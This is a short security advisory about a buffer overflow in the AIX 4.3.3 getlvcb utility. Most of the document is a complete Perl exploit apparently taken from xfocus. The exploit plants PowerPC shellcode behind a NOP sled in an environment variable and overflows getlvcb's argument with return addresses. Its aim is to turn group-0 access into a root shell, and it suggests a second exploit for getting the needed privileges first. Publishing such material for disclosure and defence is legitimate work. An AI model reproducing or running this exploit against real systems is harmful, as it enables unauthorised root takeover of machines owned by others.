source: https://www.securityfocus.com/bid/9905/info

getlvcb has been reported to be prone to a buffer overflow vulnerability.

When an argument is passed to the getlvcb utility, the string is copied into a reserved buffer in memory. Data that exceeds the size of the reserved buffer will overflow its bounds and will trample any saved data that is adjacent to the affected buffer. Ultimately this may lead to the execution of arbitrary instructions in the context of the root user.

An attacker will require system group privileges prior to the execution of the getlvcb utility, the attacker may exploit the issue described in BID 9903 in order to gain the necessary privileges required to exploit this vulnerability.

#!/usr/bin/perl
# FileName: x_getlvcb_aix433_limited.pl
# Exploit getlvcb of Aix4.3.3 to get a uid=0 shell from a gid=0.
# Tested  : on Aix4.3.3.
# Author  : watercloud@xfocus.org
# Site    : www.xfocus.org   www.xfocus.net
# Date    : 2003-5-30
# Announce: use as your owner risk!

$CMD="/usr/sbin/getlvcb";
$_=`/usr/bin/oslevel`;

$XID="\x03";
$UID="\x97";
print "\n\nExploit $CMD for Aix 4.3.3 to get uid=0 shell.\n";
print "From: [ www.xfocus.org 2003-5-30 ].\n\n";
print "Note :\n";
print "You must get gid=0 befor use this exploit,for example ";
print "my another program x_make_433_limited.pl :)\n";
print "If you get a shell euid=0 then run this command: ";
print "/usr/bin/syscall setreuid 0 0 \\; execve '/bin/sh'\n";

$NOP="\x7c\xa5\x2a\x79"x800;
%ENV=();

$ENV{CCC}="AA".$NOP.&getshell($XID,$UID);
$ret=system $CMD ,"AAA"."\x2f\xf2\x2b\x40"x300;

for($i=0;$i<4 && $ret;$i++){
  for($j=0;$j<4 && $ret;$j++) {
    $ENV{CCC}="A"x $i .$NOP.&getshell($XID,$UID);
    system $CMD ,"A"x $j ."\x2f\xf2\x2b\x40"x300;
  }
}

#sub
sub getshell($XID,$GID) {
  my $SHELL,($XID,$GID)=@_;
  $SHELL="\x7e\x94\xa2\x79\x7e\x84\xa3\x78\x40\x82\xff\xfd";
  $SHELL.="\x7e\xa8\x02\xa6\x3a\xb5\x01\x40\x88\x55\xfe\xe0";
  $SHELL.="\x7e\x83\xa3\x78\x3a\xd5\xfe\xe4\x7e\xc8\x03\xa6";
  $SHELL.="\x4c\xc6\x33\x42\x44\xff\xff\x02$GID$XID\xff\xff";
  $SHELL.="\x38\x75\xff\x04\x38\x95\xff\x0c\x7e\x85\xa3\x78";
  $SHELL.="\x90\x75\xff\x0c\x92\x95\xff\x10\x88\x55\xfe\xe1";
  $SHELL.="\x9a\x95\xff\x0b\x4b\xff\xff\xd8/bin/sh\xff";
  return $SHELL;
}
#EOF